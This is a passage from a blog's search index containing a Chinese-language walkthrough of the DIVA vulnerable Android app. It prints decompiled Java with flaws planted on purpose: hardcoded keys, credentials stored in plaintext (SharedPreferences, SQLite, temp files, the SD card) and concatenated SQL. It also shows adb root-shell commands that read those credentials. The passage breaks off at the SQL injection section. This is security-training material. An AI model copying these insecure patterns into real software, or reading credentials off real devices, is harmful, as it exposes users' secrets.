<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DIVA_Android</title>
    <url>/2023/03/25/DIVA-Android/</url>
    <content><![CDATA[<p>参考：</p>
<p><a href="https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn#am">Android 调试桥 (adb)  | Android 开发者  | Android Developers (google.cn)</a></p>
<p><a href="https://blog.csdn.net/cch139745/article/details/53420179">(40条消息) 通过DIVA了解APP安全问题_diva 安全实战_aetkrad的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/Everywhere_wwx/article/details/82256421">(40条消息) Android diva 分析（全)_Flemington、的博客-CSDN博客</a></p>
<p><a href="https://danishzia.medium.com/diva-android-app-walkthrough-bce72b7f273a">DIVA Android App — Walkthrough. Hi, | by Danish Zia | Medium</a></p>
<p><a href="https://www.cnblogs.com/Iamyoyodan/p/14923579.html">DIVA闯关-APP测试 - yoyodan - 博客园 (cnblogs.com)</a></p>
<p><a href="https://support.yeshen.com/zh-CN/qt/ml">Android ADB使用之详细篇 | 夜神模拟器帮助中心 (yeshen.com)</a></p>
<span id="more"></span>

<h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><p>Java JDK 1.8、Android SDK Tools、夜神模拟器、Apktool、dex2jar、jd-gui、AXMLPrinter2.jar、jeb（反编译）</p>
<p>使用夜神时可能会出现屏幕显示过大，可以修改渲染设置</p>
<p>之前一直adb devices找不到设备，发现可能原因是 模拟器里面开了代理的原因，关了就成功了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\software\yeshen\Nox\bin&gt;nox_adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62025 device</span><br><span class="line"></span><br><span class="line">E:\software\yeshen\Nox\bin&gt;adb connect 127.0.0.1:62025</span><br><span class="line">already connected to 127.0.0.1:62025</span><br></pre></td></tr></table></figure>

<p>命令记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit：退出shell</span><br><span class="line">adb shell：进入shell</span><br><span class="line">adb logcat：看日志</span><br></pre></td></tr></table></figure>



<h2 id="不安全的日志输出"><a href="#不安全的日志输出" class="headerlink" title="不安全的日志输出"></a>不安全的日志输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell ps| grep -i diva</span><br><span class="line">adb shell logcat | grep 316(或adb logcat)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkout</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">cctxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0096</span>);  <span class="comment">// id:ccText</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.processCC(cctxt.getText().toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(RuntimeException re) &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;diva-log&quot;</span>, <span class="string">&quot;Error while processing transaction with credit card: &quot;</span> + cctxt.getText().toString());</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;An error occured. Please try again later&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040027</span>);  <span class="comment">// layout:activity_log</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processCC</span><span class="params">(String ccstr)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="硬编码—第一部分"><a href="#硬编码—第一部分" class="headerlink" title="硬编码—第一部分"></a>硬编码—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HardcodeActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">access</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007B</span>)).getText().toString().equals(<span class="string">&quot;vendorsecretkey&quot;</span>)) &#123;  <span class="comment">// id:hcKey</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access granted! See you on the other side :)&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied! See you in hell :D&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001F</span>);  <span class="comment">// layout:activity_hardcode</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007B</span>)).getText().toString().equals(<span class="string">&quot;vendorsecretkey&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>很明确了，第二个输入字符串：<em><strong>vendorsecretkey</strong></em> 即可</p>
<h2 id="不安全的数据存储—第一部分"><a href="#不安全的数据存储—第一部分" class="headerlink" title="不安全的数据存储—第一部分"></a>不安全的数据存储—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.preference.PreferenceManager;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage1Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040023</span>);  <span class="comment">// layout:activity_insecure_data_storage1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        SharedPreferences.<span class="type">Editor</span> <span class="variable">sharedPreferences$Editor0</span> <span class="operator">=</span> PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).edit();</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0088</span>);  <span class="comment">// id:ids1Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0089</span>);  <span class="comment">// id:ids1Pwd</span></span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="string">&quot;user&quot;</span>, usr.getText().toString());</span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="string">&quot;password&quot;</span>, pwd.getText().toString());</span><br><span class="line">        sharedPreferences$Editor0.commit();</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用了SharedPreferences类，该类是Android平台上一个轻量级的存储类，主要是用来保存一些常用的配置，本例中是用该类存储了用户名和密码，因此是具有风险的。SharedPreferences类存储的数据会以.xml的形式存储在&#x2F;data&#x2F;data&#x2F;apppackagename&#x2F;shared_prefs目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">不安全的数据存储也是App常见的安全问题之一，主要有三种方式：</span><br><span class="line">1，将敏感数据保存到配置文件中；</span><br><span class="line">2，将敏感数据保存在本地的sqlite3数据库中；</span><br><span class="line">3，将敏感数据保存在临时文件或者sd卡中。</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\software\yeshen\Nox\bin&gt;adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/ # ls</span><br><span class="line">acct</span><br><span class="line">cache</span><br><span class="line">charger</span><br><span class="line">config</span><br><span class="line">d</span><br><span class="line">data</span><br><span class="line">default.prop</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">file_contexts</span><br><span class="line">fstab.shamu</span><br><span class="line">init</span><br><span class="line">init.environ.rc</span><br><span class="line">init.rc</span><br><span class="line">init.shamu.rc</span><br><span class="line">init.trace.rc</span><br><span class="line">init.usb.rc</span><br><span class="line">init.zygote32.rc</span><br><span class="line">lib</span><br><span class="line">mnt</span><br><span class="line">proc</span><br><span class="line">property_contexts</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">sdcard</span><br><span class="line">seapp_contexts</span><br><span class="line">selinux_version</span><br><span class="line">sepolicy</span><br><span class="line">service_contexts</span><br><span class="line">storage</span><br><span class="line">sys</span><br><span class="line">system</span><br><span class="line">ueventd.rc</span><br><span class="line">ueventd.shamu.rc</span><br><span class="line">vendor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/ # cd data/data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/data/data # ls</span><br><span class="line">bin.mt.plus</span><br><span class="line">com.android.Calendar</span><br><span class="line">com.android.backupconfirm</span><br><span class="line">com.android.bluetooth</span><br><span class="line">com.android.browser</span><br><span class="line">com.android.calculator2</span><br><span class="line">com.android.camera2</span><br><span class="line">com.android.captiveportallogin</span><br><span class="line">com.android.certinstaller</span><br><span class="line">com.android.contacts</span><br><span class="line">com.android.defcontainer</span><br><span class="line">com.android.deskclock</span><br><span class="line">com.android.documentsui</span><br><span class="line">com.android.dreams.basic</span><br><span class="line">com.android.externalstorage</span><br><span class="line">com.android.gallery3d</span><br><span class="line">com.android.htmlviewer</span><br><span class="line">com.android.inputdevices</span><br><span class="line">com.android.inputmethod.pinyin</span><br><span class="line">com.android.keychain</span><br><span class="line">com.android.launcher3</span><br><span class="line">com.android.location.fused</span><br><span class="line">com.android.managedprovisioning</span><br><span class="line">com.android.mms.service</span><br><span class="line">com.android.onetimeinitializer</span><br><span class="line">com.android.packageinstaller</span><br><span class="line">com.android.pacprocessor</span><br><span class="line">com.android.phasebeam</span><br><span class="line">com.android.phone</span><br><span class="line">com.android.printspooler</span><br><span class="line">com.android.providers.calendar</span><br><span class="line">com.android.providers.contacts</span><br><span class="line">com.android.providers.downloads</span><br><span class="line">com.android.providers.downloads.ui</span><br><span class="line">com.android.providers.media</span><br><span class="line">com.android.providers.settings</span><br><span class="line">com.android.providers.telephony</span><br><span class="line">com.android.providers.userdictionary</span><br><span class="line">com.android.provision</span><br><span class="line">com.android.proxyhandler</span><br><span class="line">com.android.server.telecom</span><br><span class="line">com.android.settings</span><br><span class="line">com.android.sharedstoragebackup</span><br><span class="line">com.android.shell</span><br><span class="line">com.android.soundrecorder</span><br><span class="line">com.android.systemui</span><br><span class="line">com.android.vpndialogs</span><br><span class="line">com.android.wallpaper.livepicker</span><br><span class="line">com.android.wallpapercropper</span><br><span class="line">com.cyanogenmod.filemanager</span><br><span class="line">com.google.android.webview</span><br><span class="line">com.svox.pico</span><br><span class="line">com.tencent.mm</span><br><span class="line">com.tencent.mobileqq</span><br><span class="line">de.robv.android.xposed.installer</span><br><span class="line">jakhar.aseem.diva</span><br><span class="line">just.trust.me</span><br><span class="line"></span><br><span class="line">cd jakhar.aseem.diva/shared_prefs/     </span><br><span class="line">	</span><br><span class="line">root@shamu:/data/data/jakhar.aseem.diva/shared_prefs # ls</span><br><span class="line">jakhar.aseem.diva_preferences.xml</span><br><span class="line">at jakhar.aseem.diva_preferences.xml                                          &lt;</span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span><br><span class="line">&lt;map&gt;</span><br><span class="line">    &lt;string name=&quot;user&quot;&gt;xcc&lt;/string&gt;</span><br><span class="line">    &lt;string name=&lt;/string&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>得到存的账号密码了。</p>
<h2 id="不安全的数据存储—第二部分"><a href="#不安全的数据存储—第二部分" class="headerlink" title="不安全的数据存储—第二部分"></a>不安全的数据存储—第二部分</h2><p>对应代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB = <span class="built_in">this</span>.openOrCreateDatabase(<span class="string">&quot;ids2&quot;</span>, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;CREATE TABLE IF NOT EXISTS myuser(user VARCHAR, password VARCHAR);&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;Error occurred while creating database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040024</span>);  <span class="comment">// layout:activity_insecure_data_storage2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008B</span>);  <span class="comment">// id:ids2Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008C</span>);  <span class="comment">// id:ids2Pwd</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO myuser VALUES (\&#x27;&quot;</span> + usr.getText().toString() + <span class="string">&quot;\&#x27;, \&#x27;&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;Error occurred while inserting into database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>账号密码存在sqllite</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127|root@shamu:/data/data/jakhar.aseem.diva/databases # sqlite3 ids2</span><br><span class="line">SQLite version 3.8.6.1 2015-05-21 17:24:32</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line"></span><br><span class="line">sqlite&gt; .table</span><br><span class="line">android_metadata  myuser</span><br><span class="line">sqlite&gt; select * from myuser;</span><br><span class="line">xcc|qwerty</span><br></pre></td></tr></table></figure>

<h2 id="不安全的数据存储—第三部分"><a href="#不安全的数据存储—第三部分" class="headerlink" title="不安全的数据存储—第三部分"></a>不安全的数据存储—第三部分</h2><p>对应代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040025</span>);  <span class="comment">// layout:activity_insecure_data_storage3</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008E</span>);  <span class="comment">// id:ids3Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008F</span>);  <span class="comment">// id:ids3Pwd</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">ddir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getApplicationInfo().dataDir);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file1</span> <span class="operator">=</span> File.createTempFile(<span class="string">&quot;uinfo&quot;</span>, <span class="string">&quot;tmp&quot;</span>, ddir);</span><br><span class="line">            file1.setReadable(<span class="literal">true</span>);</span><br><span class="line">            file1.setWritable(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file1);</span><br><span class="line">            fw.write(usr.getText().toString() + <span class="string">&quot;:&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;File error occurred&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;File error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>藏在临时文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/data/data/jakhar.aseem.diva # cat uinfo-382362279tmp</span><br><span class="line">xcc:qwerty</span><br></pre></td></tr></table></figure>

<h2 id="不安全的数据存储—第四部分"><a href="#不安全的数据存储—第四部分" class="headerlink" title="不安全的数据存储—第四部分"></a>不安全的数据存储—第四部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage4Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040026</span>);  <span class="comment">// layout:activity_insecure_data_storage4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0092</span>);  <span class="comment">// id:ids4Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0093</span>);  <span class="comment">// id:ids4Pwd</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file0</span> <span class="operator">=</span> Environment.getExternalStorageDirectory();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">uinfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file0.getAbsolutePath() + <span class="string">&quot;/.uinfo.txt&quot;</span>);</span><br><span class="line">            uinfo.setReadable(<span class="literal">true</span>);</span><br><span class="line">            uinfo.setWritable(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(uinfo);</span><br><span class="line">            fw.write(usr.getText().toString() + <span class="string">&quot;:&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;File error occurred&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;File error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存储sd卡的目录一般在： &#x2F;mnt&#x2F;sdcard</p>
<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/mnt/sdcard # ls -la</span><br><span class="line">-rw-rw---- root     sdcard_r       11 2023-03-25 18:15 .uinfo.txt</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Alarms</span><br><span class="line">drwxrwx--x root     sdcard_r          2023-02-06 13:46 Android</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:29 Apps</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 DCIM</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:51 Download</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:50 MT2</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Movies</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Music</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Notifications</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:29 Pictures</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Podcasts</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Ringtones</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-19 22:38 tencent</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 15:58 theme</span><br><span class="line">root@shamu:/mnt/sdcard # cat .uinfo.txt</span><br><span class="line">xcc:qwerty</span><br></pre></td></tr></table></figure>

<h2 id="输入校验问题—第一部分"><a href="#输入校验问题—第一部分" class="headerlink" title="输入校验问题—第一部分"></a>输入校验问题—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLInjectionActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// 